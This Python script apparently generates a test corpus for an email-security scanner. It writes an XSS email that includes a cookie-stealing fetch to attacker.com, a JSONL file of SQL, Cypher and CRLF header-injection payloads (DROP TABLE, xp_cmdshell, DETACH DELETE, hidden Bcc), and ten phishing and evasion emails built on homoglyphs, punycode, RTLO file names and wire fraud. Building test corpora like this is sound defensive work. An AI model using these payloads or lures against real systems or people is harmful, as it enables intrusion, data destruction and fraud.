import os
import json
import random
from pathlib import Path

CORPUS_DIR = Path("E:/SENTRY/evaluation/corpus")
ADV_DIR = CORPUS_DIR / "adversarial"
MAL_DIR = CORPUS_DIR / "malformed"
OVER_DIR = CORPUS_DIR / "oversized"

for d in [CORPUS_DIR, ADV_DIR, MAL_DIR, OVER_DIR]:
    d.mkdir(parents=True, exist_ok=True)

# 1. XSS EML Flagship Payload
xss_content = """From: "Attacker <script>alert(1)</script>" <attacker@malicious-xss.com>
To: victim@company.com
Subject: Notice: Account Review <img src="x" onerror="alert('XSS-SUBJECT')">
Date: Wed, 20 Mar 2024 12:00:00 +0000
Content-Type: text/html; charset="UTF-8"
Received: from mail.attacker.com ([185.220.101.5]) by mx.victim.com with SMTP; Wed, 20 Mar 2024 12:00:05 +0000

<html>
<body>
<h1>Urgent Account Update</h1>
<p>Click here to verify: <a href="javascript:alert('XSS-BODY')">Verify Account</a></p>
<script>alert('DOCUMENT-COOKIE-THEFT');</script>
<img src="https://attacker.com/log" onerror="fetch('http://attacker.com/steal?c='+document.cookie)" />
<iframe src="javascript:alert('IFRAME-XSS')"></iframe>
</body>
</html>
"""
(CORPUS_DIR / "xss.eml").write_text(xss_content, encoding="utf-8")

# 2. 40 Injection Payloads
injections = [
    # SQL Injections
    {"id": "SQL-01", "type": "sql", "field": "sender", "payload": "' OR '1'='1"},
    {"id": "SQL-02", "type": "sql", "field": "subject", "payload": "Normal Subject'; DROP TABLE email_records; --"},
    {"id": "SQL-03", "type": "sql", "field": "message_id", "payload": "<1234' UNION SELECT username, password_hash FROM users --@domain.com>"},
    {"id": "SQL-04", "type": "sql", "field": "search_query", "payload": "admin' --"},
    {"id": "SQL-05", "type": "sql", "field": "threat_level", "payload": "CRITICAL' OR 1=1 --"},
    {"id": "SQL-06", "type": "sql", "field": "sender_domain", "payload": "bank.com' UNION ALL SELECT null, null, null --"},
    {"id": "SQL-07", "type": "sql", "field": "date_filter", "payload": "2024-01-01' OR 'a'='a"},
    {"id": "SQL-08", "type": "sql", "field": "raw_content", "payload": "'; EXEC xp_cmdshell('whoami'); --"},
    {"id": "SQL-09", "type": "sql", "field": "email_id", "payload": "123' OR pg_sleep(5) --"},
    {"id": "SQL-10", "type": "sql", "field": "campaign_id", "payload": "CMP-001' OR (SELECT COUNT(*) FROM users)>0 --"},
    {"id": "SQL-11", "type": "sql", "field": "recipient", "payload": "victim@domain.com' AND 1=(SELECT 1) --"},
    {"id": "SQL-12", "type": "sql", "field": "ip_address", "payload": "192.168.1.1' OR '1'='1"},
    {"id": "SQL-13", "type": "sql", "field": "limit", "payload": "10; DROP TABLE analysis_results;"},
    {"id": "SQL-14", "type": "sql", "field": "offset", "payload": "0 UNION SELECT 1,2,3,4,5"},
    {"id": "SQL-15", "type": "sql", "field": "token", "payload": "bearer_token' OR 'x'='x"},

    # Cypher Injections (Neo4j)
    {"id": "CYP-01", "type": "cypher", "field": "campaign_name", "payload": "GhostRelay' DETACH DELETE n //"},
    {"id": "CYP-02", "type": "cypher", "field": "domain_node", "payload": "evil.com'} MATCH (n) DETACH DELETE n //"},
    {"id": "CYP-03", "type": "cypher", "field": "ip_node", "payload": "185.220.101.5' OR 1=1 RETURN n //"},
    {"id": "CYP-04", "type": "cypher", "field": "asn", "payload": "AS205100' WITH 1 AS x MATCH (u:User) RETURN u //"},
    {"id": "CYP-05", "type": "cypher", "field": "brand", "payload": "Apex' RETURN {all: true} //"},
    {"id": "CYP-06", "type": "cypher", "field": "link_rel", "payload": "DISTRIBUTES_VIA']-(m) DELETE m //"},
    {"id": "CYP-07", "type": "cypher", "field": "cluster_id", "payload": "cluster_1' CALL db.clearQueryCaches() //"},
    {"id": "CYP-08", "type": "cypher", "field": "tag", "payload": "tag'} CREATE (p:Attacker {name: 'Pwned'}) //"},
    {"id": "CYP-09", "type": "cypher", "field": "graph_query", "payload": "MATCH (n) RETURN n UNION MATCH (u:Secret) RETURN u"},
    {"id": "CYP-10", "type": "cypher", "field": "depth", "payload": "3 MATCH (s:Sensitive) RETURN s"},

    # Header & Protocol Injections
    {"id": "HDR-01", "type": "header_crlf", "field": "subject", "payload": "Safe Subject\r\nBcc: spy@attacker.com"},
    {"id": "HDR-02", "type": "header_crlf", "field": "from", "payload": "legit@bank.com\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>"},
    {"id": "HDR-03", "type": "header_crlf", "field": "to", "payload": "target@corp.com\r\nCC: covert@exfil.com"},
    {"id": "HDR-04", "type": "header_crlf", "field": "reply_to", "payload": "support@bank.com\r\nSet-Cookie: session=hijacked"},
    {"id": "HDR-05", "type": "header_nullbyte", "field": "filename", "payload": "invoice.pdf\x00.exe"},
    {"id": "HDR-06", "type": "header_nullbyte", "field": "sender_name", "payload": "CEO Alex\x00<attacker@evil.com>"},
    {"id": "HDR-07", "type": "header_crlf", "field": "message_id", "payload": "<msg01\r\nX-Spam-Status: No\r\n@bank.com>"},
    {"id": "HDR-08", "type": "header_crlf", "field": "received", "payload": "from legit.com\r\nAuthentication-Results: spf=pass dkim=pass"},
    {"id": "HDR-09", "type": "header_crlf", "field": "content_type", "payload": "text/plain;\r\n boundary=--evil_boundary"},
    {"id": "HDR-10", "type": "header_long", "field": "subject", "payload": "A" * 8192},
    {"id": "HDR-11", "type": "header_long", "field": "from", "payload": ("User" * 500) + "@longdomain" + ("x" * 200) + ".com"},
    {"id": "HDR-12", "type": "header_unicode", "field": "sender", "payload": "admin\uFEFF@bank.com"},
    {"id": "HDR-13", "type": "header_crlf", "field": "date", "payload": "Mon, 15 Jan 2024\r\nX-Injected: True"},
    {"id": "HDR-14", "type": "header_crlf", "field": "return_path", "payload": "<bounce@legit.com>\r\nLocation: http://phish.com"},
    {"id": "HDR-15", "type": "header_multibyte", "field": "subject", "payload": "🚨" * 500}
]

with open(CORPUS_DIR / "injection.jsonl", "w", encoding="utf-8") as f:
    for item in injections:
        f.write(json.dumps(item) + "\n")

# 3. 10 Handcrafted Adversarial Evasion EMLs
adv_emls = {
    "evasion_01_cyrillic_homoglyph.eml": """From: "Stаte Bаnk of Indiа" <support@sbі-sеcurе.com>
To: target@victim.com
Subject: Mandatory KҮC Updatе Required
Date: Tue, 16 Jan 2024 09:15:00 +0000
Received: from mail.bulletproof.net ([185.220.101.5]) by mx.victim.com with SMTP; Tue, 16 Jan 2024 09:15:05 +0000

Dear Valued Customer, please verify your credentials immediately at https://sbі-sеcurе.com/login.
""",
    "evasion_02_zero_width_spaces.eml": """From: Security Alert <security@alert-portal.com>
To: target@victim.com
Subject: U\u200bR\u200bG\u200bE\u200bN\u200bT: P\u200ba\u200bs\u200bs\u200bw\u200bo\u200br\u200bd E\u200bx\u200bp\u200bi\u200br\u200by
Date: Tue, 16 Jan 2024 10:00:00 +0000
Received: from [194.26.29.117] by mx.victim.com with SMTP; Tue, 16 Jan 2024 10:00:05 +0000

Your w\u200bi\u200br\u200be transfer and c\u200br\u200be\u200bd\u200be\u200bn\u200bt\u200bi\u200ba\u200bl\u200bs need verification.
""",
    "evasion_03_base64_multipart_nesting.eml": """From: Corporate Accounts <finance@corp-escrow.com>
To: cfo@victim.com
Subject: Invoice #88921 Attached
Date: Tue, 16 Jan 2024 11:00:00 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="BOUNDARY1"
Received: from relay.cloudhost.net ([45.33.32.156]) by mx.victim.com with ESMTP; Tue, 16 Jan 2024 11:00:05 +0000

--BOUNDARY1
Content-Type: multipart/alternative; boundary="BOUNDARY2"

--BOUNDARY2
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: base64

UGxlYXNlIHJldmlldyB0aGUgdXJnZW50IHdpcmUgdHJhbnNmZXIgcmVxdWVzdCBmb3IgJDE0Miw1
MDAgYXR0YWNoZWQu

--BOUNDARY2--
--BOUNDARY1--
""",
    "evasion_04_image_only_ocr_phish.eml": """From: DocuSign Notification <service@docusign-docs-secure.net>
To: target@victim.com
Subject: Please DocuSign: Financial Escrow Agreement
Date: Tue, 16 Jan 2024 12:00:00 +0000
Content-Type: text/html; charset="UTF-8"
Received: from [185.220.101.34] by mx.victim.com with SMTP; Tue, 16 Jan 2024 12:00:05 +0000

<html>
<body>
<a href="https://docusign-docs-secure.net/auth"><img src="https://docusign-docs-secure.net/banner.png" alt="Document Review Needed" /></a>
</body>
</html>
""",
    "evasion_05_thread_hijacking_re_fwd.eml": """From: "David Miller" <david.miller@contractor-syndicate.com>
To: finance@victim.com
Subject: Re: Q4 Project Settlement and Pending Vendor Invoices
Date: Tue, 16 Jan 2024 13:00:00 +0000
In-Reply-To: <CA+9382103910@mail.victim.com>
References: <CA+9382103910@mail.victim.com>
Received: from mail.contractor-syndicate.com ([194.26.29.117]) by mx.victim.com with SMTP; Tue, 16 Jan 2024 13:00:05 +0000

Following up on our earlier email, please use the updated banking routing coordinates for the settlement wire.
""",
    "evasion_06_punycode_idn_spoof.eml": """From: "Google Workspace Security" <admin@xn--gogle-qqa.com>
To: admin@victim.com
Subject: Critical Security Advisory: Admin Console Compromise
Date: Tue, 16 Jan 2024 14:00:00 +0000
Received: from [185.220.101.5] by mx.victim.com with SMTP; Tue, 16 Jan 2024 14:00:05 +0000

Unauthorized sign-in detected. Sign in immediately at https://xn--gogle-qqa.com/admin to revoke rogue access tokens.
""",
    "evasion_07_right_to_left_override.eml": """From: HR Department <hr@enterprise-payroll.com>
To: employee@victim.com
Subject: Updated Bonus Structure & Compensation Policy
Date: Tue, 16 Jan 2024 15:00:00 +0000
Received: from [45.33.32.156] by mx.victim.com with SMTP; Tue, 16 Jan 2024 15:00:05 +0000

Please review the attached spreadsheet: Bonus_Report_\u202egpj.exe
""",
    "evasion_08_hex_encoded_links.eml": """From: PayPal Billing Support <service@paypal-security-auth.com>
To: user@victim.com
Subject: Unauthorized Transaction of $899.99 Reported
Date: Tue, 16 Jan 2024 16:00:00 +0000
Received: from [185.220.101.34] by mx.victim.com with SMTP; Tue, 16 Jan 2024 16:00:05 +0000

Cancel this transaction within 12 hours at http://0xb9dc6505/dispute to ensure immediate funds restoration.
""",
    "evasion_09_bec_lookalike_displayname.eml": """From: "Robert Vance (Chief Operating Officer)" <robert.vance.exec12@gmail.com>
Reply-To: r.vance@vance-refrigeration-corp.net
To: controller@victim.com
Subject: Urgent: Confidential Acquisition Wire Payment Required Today
Date: Tue, 16 Jan 2024 17:00:00 +0000
Received: from [194.26.29.117] by mx.victim.com with HTTP; Tue, 16 Jan 2024 17:00:05 +0000

Please process the international vendor wire transfer of $275,000 before close of business. Do not call as I am in Board meetings.
""",
    "evasion_10_clock_skew_relay_forgery.eml": """From: IT Helpdesk <support@it-services-desk.com>
To: user@victim.com
Subject: Mandatory System Password Rotation Notice
Date: Mon, 15 Jan 2024 08:00:00 +0000
Received: from forged.relay.com ([185.220.101.5]) by intermediate.net with ESMTP; Sun, 20 Jan 2030 18:00:00 +0000
Received: from intermediate.net by mx.victim.com with ESMTP; Mon, 15 Jan 2024 08:00:05 +0000

Your corporate Active Directory password will expire today. Update credentials immediately.
"""
}

for filename, content in adv_emls.items():
    (ADV_DIR / filename).write_text(content, encoding="utf-8")

# 4. Generate 100 Malformed Fuzz EMLs
seed_files = list(Path("E:/SENTRY/sample_emails").glob("*.eml"))
random.seed(42)

for i in range(1, 101):
    base_file = random.choice(seed_files)
    raw_bytes = bytearray(base_file.read_bytes())
    # Mutate 1 to 5 random bytes
    num_mutations = random.randint(1, 5)
    for _ in range(num_mutations):
        idx = random.randint(0, len(raw_bytes) - 1)
        raw_bytes[idx] = random.randint(0, 255)
    (MAL_DIR / f"malformed_{i:03d}.eml").write_bytes(raw_bytes)

# 5. Generate Oversized Fixture (52 MB dummy payload)
with open(OVER_DIR / "oversized_52mb.eml", "wb") as f:
    f.write(b"From: oversized@sender.com\r\nTo: target@victim.com\r\nSubject: Huge Attachment\r\n\r\n")
    chunk = b"A" * 1024 * 1024
    for _ in range(52):
        f.write(chunk)

print("[*] Corpus generation complete:")
print(f"  - Flagship XSS: {CORPUS_DIR / 'xss.eml'}")
print(f"  - Injections: {len(injections)} payloads in {CORPUS_DIR / 'injection.jsonl'}")
print(f"  - Adversarial: {len(adv_emls)} EMLs in {ADV_DIR}")
print(f"  - Malformed Fuzz: 100 EMLs in {MAL_DIR}")
print(f"  - Oversized: {OVER_DIR / 'oversized_52mb.eml'}")
